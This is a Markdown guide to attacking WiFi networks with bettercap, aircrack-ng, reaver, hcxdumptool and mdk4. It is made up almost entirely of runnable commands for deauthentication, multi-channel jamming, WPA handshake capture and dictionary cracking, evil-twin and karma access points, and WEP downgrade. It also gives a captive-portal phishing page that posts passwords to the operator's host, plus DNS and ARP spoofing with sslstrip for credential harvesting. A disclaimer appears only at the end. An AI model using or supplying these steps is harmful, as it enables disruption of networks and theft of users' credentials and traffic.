# Bettercap WiFi Attack Guide

## Table of Contents
1. [WiFi Setup & Configuration](#wifi-setup--configuration)
2. [WiFi Reconnaissance](#wifi-reconnaissance)
3. [Deauthentication Attacks](#deauthentication-attacks)
4. [WPA/WPA2 Handshake Capture](#wpawpa2-handshake-capture)
5. [Evil Twin / Rogue AP](#evil-twin--rogue-ap)
6. [WiFi Jamming](#wifi-jamming)
7. [Client Isolation Attacks](#client-isolation-attacks)
8. [Advanced WiFi Attacks](#advanced-wifi-attacks)

---

## WiFi Setup & Configuration

### Prerequisites
```bash
# Install required tools
sudo apt update
sudo apt install bettercap wireless-tools aircrack-ng -y

# Check wireless interface
iwconfig
ip link show

# Identify wireless interface name (usually wlan0, wlan1, wlp3s0, etc.)
ifconfig -a | grep -i wlan
```

### Enable Monitor Mode
```bash
# Method 1: Using airmon-ng
sudo airmon-ng check kill
sudo airmon-ng start wlan0

# Your interface name will change to wlan0mon or similar
iwconfig

# Method 2: Using ip commands
sudo ip link set wlan0 down
sudo iw dev wlan0 set type monitor
sudo ip link set wlan0 up

# Method 3: Using ifconfig
sudo ifconfig wlan0 down
sudo iwconfig wlan0 mode monitor
sudo ifconfig wlan0 up
```

### Verify Monitor Mode
```bash
# Check if monitor mode is active
iwconfig wlan0mon

# Should show "Mode:Monitor"

# Test with packet capture
sudo airodump-ng wlan0mon
```

### Launch Bettercap in WiFi Mode
```bash
# Start bettercap on wireless interface
sudo bettercap -iface wlan0mon

# Start with WiFi module auto-enabled
sudo bettercap -iface wlan0mon -eval "wifi.recon on"
```

---

## WiFi Reconnaissance

### Basic WiFi Discovery
```bash
# Start WiFi reconnaissance
wifi.recon on

# Show all discovered access points
wifi.show

# Show detailed AP information
wifi.show.wps
```

### Detailed Network Scanning
```bash
# Enable WiFi recon with all channels
set wifi.recon.channel 1,2,3,4,5,6,7,8,9,10,11,12,13

# Scan all channels sequentially
wifi.recon.on

# Show APs sorted by channel
wifi.show

# Show only APs with clients
wifi.show.clients
```

### Target Specific Channel
```bash
# Lock to specific channel (reduces channel hopping)
set wifi.recon.channel 6
wifi.recon on

# Show networks on channel 6
wifi.show
```

### Filter Networks by Criteria
```bash
# Show only networks with clients
wifi.recon on
wifi.show

# Search for specific SSID
wifi.recon on
# In output, look for SSID name

# Show WPS-enabled networks
wifi.show.wps
```

### Export Discovered Networks
```bash
# Enable logging
set events.stream.output /tmp/wifi-scan.log
events.stream on
wifi.recon on

# Wait for discovery, then check log
!cat /tmp/wifi-scan.log | grep -i "wifi"
```

---

## Deauthentication Attacks

### Deauth Single Client
```bash
# Start reconnaissance first
wifi.recon on

# Wait for client detection
wifi.show

# Deauth specific client from specific AP
# Format: wifi.deauth BSSID CLIENT_MAC
wifi.deauth AA:BB:CC:DD:EE:FF 11:22:33:44:55:66

# Example
wifi.deauth 00:11:22:33:44:55 AA:BB:CC:DD:EE:FF
```

### Deauth All Clients from AP
```bash
# Scan for networks
wifi.recon on
wifi.show

# Deauth all clients from specific AP (broadcast deauth)
# Use "ff:ff:ff:ff:ff:ff" as client MAC for broadcast
wifi.deauth AA:BB:CC:DD:EE:FF ff:ff:ff:ff:ff:ff

# Example: Deauth everyone from router 00:11:22:33:44:55
wifi.deauth 00:11:22:33:44:55 ff:ff:ff:ff:ff:ff
```

### Continuous Deauth Attack
```bash
# Start recon
wifi.recon on

# Use ticker for repeated deauth
set ticker.period 5
set ticker.commands "wifi.deauth 00:11:22:33:44:55 ff:ff:ff:ff:ff:ff"
ticker on

# This will send deauth every 5 seconds

# Stop the attack
ticker off
```

### Mass Deauth (All Networks)
```bash
# Deauth all clients on all discovered APs
wifi.recon on

# Create automated caplet
# File: /tmp/mass-deauth.cap
# Content:
# wifi.recon on
# sleep 10
# set ticker.period 3
# set ticker.commands clear; wifi.show; wifi.deauth ff:ff:ff:ff:ff:ff ff:ff:ff:ff:ff:ff
# ticker on

# Run caplet
sudo bettercap -iface wlan0mon -caplet /tmp/mass-deauth.cap
```

### Targeted Deauth for Handshake Capture
```bash
# Lock to target channel
set wifi.recon.channel 6

# Enable recon
wifi.recon on

# Wait for target and client discovery
wifi.show

# Set specific target BSSID
set wifi.deauth.bssid 00:11:22:33:44:55

# Deauth client to force reconnection (captures handshake)
wifi.deauth 00:11:22:33:44:55 AA:BB:CC:DD:EE:FF
```

---

## WPA/WPA2 Handshake Capture

### Automated Handshake Capture
```bash
# Set channel of target network
set wifi.recon.channel 6

# Enable handshake capture
set wifi.handshakes.file /root/handshakes.pcap

# Start recon
wifi.recon on

# Deauth clients to force handshake
wifi.deauth TARGET_BSSID TARGET_CLIENT_MAC

# Handshake will be saved automatically to /root/handshakes.pcap
```

### Manual Handshake Capture with Monitoring
```bash
# Start airodump-ng in separate terminal for verification
!airodump-ng -c 6 --bssid 00:11:22:33:44:55 -w /tmp/capture wlan0mon &

# In bettercap
wifi.recon on
set wifi.recon.channel 6

# Deauth to trigger handshake
wifi.deauth 00:11:22:33:44:55 ff:ff:ff:ff:ff:ff

# Check for handshake in airodump output
# Look for "WPA handshake: 00:11:22:33:44:55"
```

### Capture Multiple Handshakes
```bash
# Set output file
set wifi.handshakes.file /root/all-handshakes.pcap

# Enable aggregation
set wifi.handshakes.aggregate true

# Start recon on all channels
wifi.recon on

# Create ticker to deauth all APs periodically
set ticker.period 15
set ticker.commands wifi.deauth ff:ff:ff:ff:ff:ff ff:ff:ff:ff:ff:ff
ticker on

# Let run for 10-15 minutes to capture multiple handshakes
```

### Verify Captured Handshake
```bash
# Use aircrack-ng to verify
!aircrack-ng /root/handshakes.pcap

# If handshake present, you'll see:
# "1 handshake"

# Analyze with Wireshark
!wireshark /root/handshakes.pcap &
```

### Crack WPA/WPA2 Handshake
```bash
# After capturing handshake, use aircrack-ng
!aircrack-ng /root/handshakes.pcap -w /usr/share/wordlists/rockyou.txt

# Or use hashcat for GPU acceleration
!aircrack-ng /root/handshakes.pcap -J /tmp/hashcat-format
!hashcat -m 2500 /tmp/hashcat-format.hccapx /usr/share/wordlists/rockyou.txt

# For WPA3, different approach needed (not directly supported by bettercap)
```

---

## Evil Twin / Rogue AP

### Create Fake Access Point
```bash
# Stop network manager first
!systemctl stop NetworkManager

# Configure fake AP settings
set wifi.ap.ssid "Free Public WiFi"
set wifi.ap.bssid AA:BB:CC:DD:EE:FF
set wifi.ap.channel 6
set wifi.ap.encryption false

# Start the fake AP
wifi.ap
```

### Evil Twin with WPA2 Password
```bash
# Create password-protected fake AP
set wifi.ap.ssid "Corporate_WiFi"
set wifi.ap.bssid AA:BB:CC:DD:EE:FF
set wifi.ap.channel 6
set wifi.ap.encryption true
set wifi.ap.psk "password123"

# Start AP
wifi.ap
```

### Evil Twin + Deauth Original
```bash
# Start recon to find target
wifi.recon on
wifi.show

# Note target BSSID and channel
# Example: TARGET = 00:11:22:33:44:55, Channel = 6

# Create fake AP with same SSID
set wifi.ap.ssid "TARGET_SSID_NAME"
set wifi.ap.channel 6
set wifi.ap.encryption false
wifi.ap

# Deauth clients from real AP (forces connection to yours)
set ticker.period 5
set ticker.commands wifi.deauth 00:11:22:33:44:55 ff:ff:ff:ff:ff:ff
ticker on
```

### Captive Portal Attack
```bash
# Setup fake AP
set wifi.ap.ssid "Free Airport WiFi"
set wifi.ap.channel 6
set wifi.ap.encryption false
wifi.ap

# Setup captive portal (requires separate web server)
# In another terminal, create simple phishing page
!echo '<html><body><h1>Enter Password</h1><form method="POST" action="http://YOUR_IP/capture.php"><input type="password" name="pwd"><input type="submit"></form></body></html>' > /tmp/captive.html

# Run simple HTTP server
!cd /tmp && python3 -m http.server 80 &

# Configure DNS spoofing to redirect all traffic
set dns.spoof.all true
set dns.spoof.address YOUR_IP
dns.spoof on

# Clients connecting to fake AP will see captive portal
```

### Evil Twin with Full Internet Access
```bash
# Setup internet sharing
!echo 1 > /proc/sys/net/ipv4/ip_forward
!iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE
!iptables -A FORWARD -i wlan0 -o eth0 -j ACCEPT

# Create fake AP
set wifi.ap.ssid "Starbucks_Guest"
set wifi.ap.channel 1
set wifi.ap.encryption false
wifi.ap

# Start DHCP server for clients
set dhcp.server.enable true
set dhcp.server.address 192.168.1.1
set dhcp.server.pool.start 192.168.1.100
set dhcp.server.pool.end 192.168.1.200
dhcp.server on

# Now you can MITM all traffic
set arp.spoof.targets 192.168.1.0/24
arp.spoof on
http.proxy on
```

---

## WiFi Jamming

### Continuous Channel Jamming
```bash
# Jam specific channel
set wifi.recon.channel 6
wifi.recon on

# Continuous broadcast deauth on channel
set ticker.period 1
set ticker.commands wifi.deauth ff:ff:ff:ff:ff:ff ff:ff:ff:ff:ff:ff
ticker on

# This effectively jams channel 6
```

### Multi-Channel Jamming
```bash
# Create jamming script
# File: /tmp/jam-all.cap
# Content:
# set wifi.recon.channel 1,2,3,4,5,6,7,8,9,10,11
# wifi.recon on
# set ticker.period 1
# set ticker.commands wifi.deauth ff:ff:ff:ff:ff:ff ff:ff:ff:ff:ff:ff
# ticker on

# Execute
sudo bettercap -iface wlan0mon -caplet /tmp/jam-all.cap
```

### Selective Network Jamming
```bash
# Jam only specific APs
wifi.recon on
wifi.show

# Create list of target BSSIDs
# Target BSSID 1
wifi.deauth 00:11:22:33:44:55 ff:ff:ff:ff:ff:ff

# Target BSSID 2
wifi.deauth AA:BB:CC:DD:EE:FF ff:ff:ff:ff:ff:ff

# Automate with ticker
set ticker.period 3
set ticker.commands wifi.deauth 00:11:22:33:44:55 ff:ff:ff:ff:ff:ff; wifi.deauth AA:BB:CC:DD:EE:FF ff:ff:ff:ff:ff:ff
ticker on
```

---

## Client Isolation Attacks

### Discover Hidden SSIDs
```bash
# Enable WiFi recon
wifi.recon on

# Deauth clients from hidden networks
# Clients will try to reconnect and reveal SSID
wifi.deauth TARGET_BSSID TARGET_CLIENT

# Watch for SSID in output
wifi.show
```

### Force Client Disclosure
```bash
# Scan for clients
wifi.recon on

# Deauth all clients
wifi.deauth ff:ff:ff:ff:ff:ff ff:ff:ff:ff:ff:ff

# Clients will broadcast probe requests
# Revealing networks they've connected to before
events.stream on

# Look for probe requests in output
```

### Capture Client Probes
```bash
# Enable verbose output
set events.stream.output /tmp/probes.log
events.stream on

# Enable recon
wifi.recon on

# Deauth to trigger probes
wifi.deauth ff:ff:ff:ff:ff:ff ff:ff:ff:ff:ff:ff

# Analyze captured probes
!cat /tmp/probes.log | grep -i "probe"
```

---

## Advanced WiFi Attacks

### WPS PIN Attack
```bash
# Scan for WPS-enabled networks
wifi.recon on
wifi.show.wps

# Note WPS-enabled BSSID
# Use reaver for WPS attack (external tool)
!reaver -i wlan0mon -b 00:11:22:33:44:55 -vv -c 6

# Or use bully
!bully -b 00:11:22:33:44:55 -c 6 wlan0mon
```

### PMKID Attack (WPA/WPA2 Clientless)
```bash
# This attack doesn't require clients or handshake
# Use hcxdumptool (external)
!hcxdumptool -i wlan0mon -o /tmp/pmkid.pcapng --enable_status=1

# Convert for hashcat
!hcxpcaptool -z /tmp/pmkid.hc22000 /tmp/pmkid.pcapng

# Crack with hashcat
!hashcat -m 22000 /tmp/pmkid.hc22000 /usr/share/wordlists/rockyou.txt
```

### Karma Attack (Auto-Association)
```bash
# Capture probe requests first
wifi.recon on
events.stream on

# Note which SSIDs clients are searching for
# Create multiple fake APs with those SSIDs

# Example: If client probes for "Home_WiFi"
set wifi.ap.ssid "Home_WiFi"
set wifi.ap.encryption false
wifi.ap

# Client will auto-connect
```

### WiFi Packet Injection
```bash
# Test injection capability
!aireplay-ng --test wlan0mon

# Inject deauth packets at high rate
!aireplay-ng --deauth 0 -a 00:11:22:33:44:55 wlan0mon

# Combine with bettercap for full control
wifi.recon on
wifi.deauth 00:11:22:33:44:55 ff:ff:ff:ff:ff:ff
```

### Rogue AP + DNS Redirect
```bash
# Create fake AP
set wifi.ap.ssid "Hotel_Guest_WiFi"
set wifi.ap.channel 6
wifi.ap

# DNS spoof all requests
set dns.spoof.all true
set dns.spoof.address YOUR_SERVER_IP
dns.spoof on

# HTTP redirect
http.proxy on

# Serve phishing page
!python3 -m http.server 80 &
```

### WiFi Downgrade Attack
```bash
# Force clients to use weak encryption
# Create fake AP with WEP
set wifi.ap.ssid "TARGET_NETWORK"
set wifi.ap.encryption true
set wifi.ap.encryption.type wep
set wifi.ap.encryption.key "12345"
wifi.ap

# Deauth from real WPA2 network
wifi.deauth REAL_BSSID ff:ff:ff:ff:ff:ff

# Some legacy clients may connect to WEP version
# WEP is easily crackable
```

### Beacon Flood Attack
```bash
# Create multiple fake APs to confuse users
# Use mdk4 (external tool)
!mdk4 wlan0mon b -f /tmp/ssid-list.txt -a -s 1000

# ssid-list.txt contains:
# Free WiFi
# Guest Network
# Airport WiFi
# Hotel WiFi
# [100s more lines]

# This floods area with fake SSIDs
```

### Capture & Relay Attack
```bash
# Capture handshake
set wifi.handshakes.file /tmp/handshake.pcap
wifi.recon on
wifi.deauth TARGET_BSSID TARGET_CLIENT

# Create fake AP with captured credentials
# (Requires analyzing handshake first)
# Then setup evil twin with correct password
set wifi.ap.ssid "REAL_NETWORK_NAME"
set wifi.ap.encryption true
set wifi.ap.psk "CRACKED_PASSWORD"
wifi.ap

# Clients connect to you instead
```

### WiFi Survey & Mapping
```bash
# Continuous scanning with GPS (if available)
set wifi.recon.channel 1,2,3,4,5,6,7,8,9,10,11,12,13
set events.stream.output /tmp/wifi-survey.log
events.stream on
wifi.recon on

# Log location data
# Process later with tools like Wigle WiFi

# Create heatmap of networks
!cat /tmp/wifi-survey.log | grep wifi.ap.new | awk '{print $5}' | sort | uniq -c
```

---

## Complete Attack Scenarios

### Scenario 1: Full WPA2 Network Compromise
```bash
# 1. Enable monitor mode
sudo airmon-ng start wlan0

# 2. Launch bettercap
sudo bettercap -iface wlan0mon

# 3. Discover target
wifi.recon on
wifi.show

# 4. Lock to target channel (example: channel 6)
set wifi.recon.channel 6

# 5. Capture handshake
set wifi.handshakes.file /root/target.pcap
wifi.deauth TARGET_BSSID TARGET_CLIENT

# 6. Crack password offline
!aircrack-ng /root/target.pcap -w /usr/share/wordlists/rockyou.txt

# 7. Access network with cracked password
```

### Scenario 2: Evil Twin Credential Harvesting
```bash
# 1. Identify target network
wifi.recon on
wifi.show

# Note: SSID="Corporate" BSSID=00:11:22:33:44:55 Channel=6

# 2. Create evil twin
set wifi.ap.ssid "Corporate"
set wifi.ap.channel 6
wifi.ap

# 3. Deauth real AP clients
set ticker.period 5
set ticker.commands wifi.deauth 00:11:22:33:44:55 ff:ff:ff:ff:ff:ff
ticker on

# 4. Setup captive portal
set dns.spoof.all true
set dns.spoof.address YOUR_IP
dns.spoof on

# 5. Serve fake login page (in another terminal)
# Create fake-login.html with password form
!python3 -m http.server 80

# 6. Capture credentials from form submissions
```

### Scenario 3: Public WiFi MITM
```bash
# 1. Connect to public WiFi normally first

# 2. Enable monitor mode on second adapter
sudo airmon-ng start wlan1

# 3. Clone the public WiFi
wifi.recon on
wifi.show
# Note real AP details

set wifi.ap.ssid "REAL_AP_SSID"
set wifi.ap.channel REAL_CHANNEL
set wifi.ap.encryption false
wifi.ap

# 4. Deauth users from real AP
wifi.deauth REAL_BSSID ff:ff:ff:ff:ff:ff

# 5. Users connect to your AP
# Enable MITM
arp.spoof on
http.proxy on
set http.proxy.sslstrip true

# 6. Harvest credentials
net.sniff on
events.stream on
```

---

## Quick Reference Commands

### Essential WiFi Commands
```bash
wifi.recon on/off                    # Start/stop WiFi reconnaissance
wifi.show                            # Show discovered APs
wifi.show.wps                        # Show WPS-enabled APs
wifi.deauth BSSID CLIENT             # Deauthenticate client
wifi.ap                              # Start access point
```

### Configuration Commands
```bash
set wifi.recon.channel N             # Set channel (1-13)
set wifi.handshakes.file PATH        # Set handshake output file
set wifi.ap.ssid NAME                # Set AP name
set wifi.ap.bssid MAC                # Set AP MAC
set wifi.ap.channel N                # Set AP channel
set wifi.ap.encryption true/false    # Enable/disable encryption
set wifi.ap.psk PASSWORD             # Set WPA password
```

### Monitoring Commands
```bash
events.stream on                     # Real-time event monitoring
events.show                          # Show event history
ticker on/off                        # Enable/disable ticker (automation)
set ticker.period SECONDS            # Set ticker interval
set ticker.commands "COMMANDS"       # Set commands to repeat
```

---

## Safety & Legal Disclaimer

**CRITICAL WARNING:** WiFi attacks can be:
- **Illegal** in most jurisdictions without authorization
- **Disruptive** to critical services (hospitals, emergency services)
- **Traceable** - MAC addresses and locations can be logged

### Legal Use Only:
- Your own networks
- Authorized penetration testing
- Controlled lab environments
- Educational research with permission
- Security assessments with written authorization

### Emergency Stop
```bash
# Immediately stop all attacks
ticker off
wifi.ap.stop
wifi.recon off
arp.spoof off
dns.spoof off

# Disable monitor mode
sudo airmon-ng stop wlan0mon

# Restart NetworkManager
sudo systemctl start NetworkManager
```

---

## Troubleshooting

### Monitor Mode Issues
```bash
# Kill interfering processes
sudo airmon-ng check kill

# Manually set monitor mode
sudo ip link set wlan0 down
sudo iw dev wlan0 set type monitor
sudo ip link set wlan0 up

# Verify
iwconfig wlan0
```

### Deauth Not Working
```bash
# Check channel - must match target
set wifi.recon.channel TARGET_CHANNEL

# Increase deauth packet count
# Use external tool
!aireplay-ng --deauth 50 -a TARGET_BSSID wlan0mon

# Some modern devices have protection against deauth
# Try client isolation or use other methods
```

### No Handshake Captured
```bash
# Ensure client is actually connected
wifi.show

# Try deauthing multiple times
wifi.deauth BSSID CLIENT
# Wait 5 seconds
wifi.deauth BSSID CLIENT

# Verify with airodump-ng in parallel
!airodump-ng -c CHANNEL --bssid BSSID wlan0mon
```

### Fake AP Not Visible
```bash
# Check if AP is running
!iw dev

# Verify channel isn't crowded
!airodump-ng wlan0mon
# Pick less crowded channel

# Increase transmission power
!iw dev wlan0mon set txpower fixed 3000

# Check if clients can see it
!airodump-ng -c YOUR_CHANNEL wlan0mon
```

---

## Additional Tools & Resources

### Complementary Tools
```bash
# Aircrack-ng suite
sudo apt install aircrack-ng

# Reaver (WPS attacks)
sudo apt install reaver

# Wireshark (packet analysis)
sudo apt install wireshark

# hcxtools (PMKID attacks)
sudo apt install hcxtools

# mdk4 (stress testing)
git clone https://github.com/aircrack-ng/mdk4
cd mdk4/
make
sudo make install
```

### Resources
- Bettercap WiFi Module: https://www.bettercap.org/modules/wifi/
- Aircrack-ng Documentation: https://www.aircrack-ng.org/
- OSWP Certification: https://www.offensive-security.com/wifu-oswp/
- WiFi Hacking Guide: https://github.com/brannondorsey/wifi-cracking

---

*Use responsibly and legally. This guide is for authorized security testing only.*
